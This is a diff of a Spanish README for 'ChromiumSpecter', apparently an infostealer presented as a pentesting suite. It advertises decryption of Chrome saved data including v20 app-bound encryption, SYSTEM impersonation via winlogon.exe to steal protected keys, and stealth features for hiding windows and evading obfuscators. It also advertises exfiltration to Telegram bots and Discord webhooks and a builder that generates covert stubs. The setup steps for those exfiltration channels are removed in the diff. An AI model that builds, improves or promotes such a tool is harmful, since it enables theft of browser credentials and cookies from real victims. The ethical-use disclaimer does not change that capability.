@@ -1,4 +1,4 @@
-# 🛡️ ChromiumSpecter Auditor Suite `v2.5.0` (V20 Update)
+# 🛡️ ChromiumSpecter Auditor Suite `v2.5.0` (V20 Stable)
 
 > [!NOTE]
 > [English Version](README.en.md) | **Versión en Español**
@@ -32,10 +32,10 @@
 ### 🌟 Características Destacadas
 
 * **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados.
-* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.0.0`**:
-  * Full support for **Chrome v127+ (App-Bound Encryption)** via the new `v20_decryptor` module.
-  * Hybrid Decryption: Supports **AES-GCM (v10/v11)**, **DPAPI Legacy**, and the new **v20** scheme in the same database.
-  * **Intelligent Synchronization**: The engine now uses dynamic imports to survive obfuscators and ensure portability.
+* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.5.0`**:
+  * Soporte total para **Chrome v127+ (App-Bound Encryption)** mediante el nuevo módulo `v20_decryptor`.
+  * Descifrado híbrido: Soporta **AES-GCM (v10/v11)**, **DPAPI Legacy** y el nuevo esquema **v20** en la misma base de datos.
+  * **Sincronización Inteligente**: El motor ahora utiliza importaciones dinámicas para sobrevivir a ofuscadores y garantizar portabilidad.
   * **Escalada de Privilegios**: Implementa impersonación nativa de SYSTEM (vía `winlogon.exe`) para extraer llaves protegidas por el sistema. **(Requiere ejecutar como Administrador)**.
   * Detección inteligente: El motor identifica el prefijo (`v10`, `v11`, `v20`) y aplica el algoritmo correspondiente con fallback automático.
 * **🕵️ Motor de Sigilo (Tactical Stealth)**:
@@ -58,7 +58,7 @@
 * **Multi-Canal**: Soporte nativo para **Telegram Bots** y **Discord Webhooks** con redundancia.
 * **Persistencia Local**: Guardado seguro de configuraciones de exfiltración para uso recurrente.
 
-### 🛠️ Builder Visual Integrado `v2.0.0`
+### 🛠️ Builder Visual Integrado `v2.5.0`
 
 Generación de stubs personalizados con **Inyección Dinámica** de parámetros.
 **Universal Dependency Injection**: El builder ahora parsea automáticamente `requirements.txt` y resuelve dependencias en tiempo de compilación.
@@ -141,7 +141,7 @@ Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu bin
 > - **Mostrar Consola** (Compilador): Determina si el **Sistema Operativo** crea la ventana desde cero. Desmarcado = `Windowed App`, nunca hay ventana negra.
 > - **Modo Stealth** (Runtime): La ventana sí se crea, pero el código la oculta en milisegundos con `ShowWindow(0)`. Puede verse un destello breve.
 > - **Recomendación**: Dejá "Mostrar Consola" **desmarcado** + "Modo Stealth" **marcado** para doble capa de sigilo.
-
+```
 
 ---
 
@@ -174,43 +174,21 @@ python gui_app.py
 
 ---
 
-## 📡 Configuración de Exfiltración
-
-### 🤖 Telegram
-
-Requiere **Token** y **Chat ID**.
-
-* Obtén el token con `@BotFather`.
-* Obtén tu ID con `@userinfobot`.
-
-### 🎮 Discord
-
-Requiere **Webhook URL**.
-
-* Configúralo en: Ajustes del Canal -> Integraciones -> Webhooks.
-
----
-
 ## 🧪 Calidad y Testing
 
 La suite incluye una batería de pruebas automatizadas para garantizar la integridad de los algoritmos de descifrado y los canales de exfiltración.
 
-Para ejecutar los tests, asegúrate de tener activado el entorno virtual y corre:
-
 ```bash
 # Ejecutar todos los tests
-pytest
-
-# Ejecutar con reporte detallado
 pytest -v
 ```
 
-> [!TIP]
-> Los tests utilizan `pytest-mock` para simular llamadas de red y acceso a archivos del sistema, lo que permite validaciones seguras sin riesgo de exfiltración real durante las pruebas.
-
 ---
 
-## ⚖️ Aviso Legal y Ético
+## ⚖️ Licencia y Uso Ético
+
+### Licencia
+Este proyecto está bajo la licencia **GNU General Public License v3.0 (GPLv3)**. Esto significa que puedes usar, modificar y distribuir el software, pero cualquier trabajo derivado debe ser también de código abierto bajo la misma licencia y **debe dar crédito explícito al autor original (ANONIMO432HZ)**. Consulta el archivo [LICENSE](LICENSE) para más detalles.
 
 > [!CAUTION]
 > **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
